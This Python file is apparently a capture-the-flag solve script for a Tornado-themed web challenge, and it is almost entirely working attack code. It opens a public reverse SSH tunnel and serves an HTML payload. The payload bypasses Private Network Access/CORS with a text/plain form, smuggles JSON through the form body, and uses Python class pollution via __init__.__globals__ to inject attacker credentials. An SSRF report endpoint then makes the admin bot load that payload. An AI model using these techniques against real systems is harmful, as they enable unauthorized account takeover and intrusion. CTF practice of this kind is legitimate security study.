import json
import requests
import threading
import time
import subprocess
import re

from http.server import HTTPServer, BaseHTTPRequestHandler


# TARGET_URL = "http://154.57.164.70:30368"
TARGET_URL = "http://localhost:1337"
LOCAL_PORT = 9001
INJECTED_USER = "vego"
INJECTED_PASS = "pwned"


class PayloadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Bot hit {self.path} - Serving Payload...")
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(payload.encode())

    def log_message(self, format, *args): return


def start_server():
    server = HTTPServer(('0.0.0.0', LOCAL_PORT), PayloadHandler)
    server.serve_forever()


def solve():
    global payload
    ssh_proc = None

    try:
        threading.Thread(target=start_server, daemon=True).start()

        print("[*] Opening tunnel via nokey@localhost.run...")
        ssh_cmd = ["ssh", "-R", f"80:localhost:{LOCAL_PORT}", "-o", "StrictHostKeyChecking=no", "nokey@localhost.run"]
        
        ssh_proc = subprocess.Popen(
            ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )

        public_url = ""
        print("[*] Waiting for tunnel initialization...")

        for line in ssh_proc.stdout:
            clean_line = line.strip().lower()
            if "tunneled with tls termination" in clean_line:
                match = re.search(r'https?://[a-zA-Z0-9.-]+\.(lhr\.life|localhost\.run)', line)
                if match:
                    public_url = match.group(0)
                    break
        
        if not public_url:
            print("[-] Automated extraction failed.")
            return

        bot_ip = public_url.replace("https://", "").replace("http://", "")
        print(f"[+] Using Tunnel: {public_url}")

        r = requests.get(f"{TARGET_URL}/get_tornados")
        machine_id = r.json()[0]['machine_id']
        print(f"[*] Retrieved machine_id: {machine_id}")

        ######################################## PAYLOAD ########################################
        # 1. PNA/CORS BYPASS: We use a <form> with enctype="text/plain" instead of fetch(). 
        #    Standard forms are "Simple Requests" that bypass modern Private Network Access (PNA) 
        #    restrictions, which would otherwise block a public tunnel from hitting 127.0.0.1.
        #
        # 2. JSON SMUGGLING: Since forms send data as 'name=value', we put the JSON start in 
        #    the 'name' attribute and the JSON end in the 'value' attribute. The browser's 
        #    mandatory '=' sign gets "swallowed" into the "dummy" key, resulting in a 
        #    perfectly valid JSON body: {"machine_id": "...", ..., "dummy": "=="}
        #
        # 3. CLASS POLLUTION: The payload targets the '__init__.__globals__' path of the 
        #    Tornado object. By merging our data into the global scope, we overwrite the 
        #    server's in-memory 'USERS' list with our own credentials.
        #
        payload = f"""
        <!DOCTYPE html>
        <html>
        <body>
            <form id="pwn" action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
                <input name='{{"machine_id": "{machine_id}", "__init__": {{"__globals__": {{"USERS": [{{"username": "{INJECTED_USER}", "password": "{INJECTED_PASS}"}}]}}}}, "dummy": "' value='"}}'>
            </form>
            <script>
                setTimeout(() => {{
                    document.getElementById("pwn").submit();
                    // Optional: hit our tunnel so we know the form was sent
                    fetch('/pwned'); 
                }}, 500);
            </script>
        </body>
        </html>
        """

        # Trigger bot via SSRF
        print(f"[*] Triggering bot via /report_tornado?ip={bot_ip}")
        requests.get(f"{TARGET_URL}/report_tornado", params={"ip": bot_ip})

        print("[*] Waiting 15s for the bot to run the JS...")
        time.sleep(15)

        print("[*] Attempting to login with the injected user...")
        session = requests.Session()
        r = session.post(f"{TARGET_URL}/login", json={
            "username": INJECTED_USER, "password": INJECTED_PASS
        })

        if "Login successful" in r.text:
            flag_r = session.get(f"{TARGET_URL}/stats")
            flag = json.loads(flag_r.text)["success"]["message"]
            print(f"[+] Flag received: {flag}")
        else:
            print("[-] Login failed!")

    finally:
        if ssh_proc:
            ssh_proc.terminate()
            print("[*] SSH Tunnel closed.")


if __name__ == "__main__":
    solve()
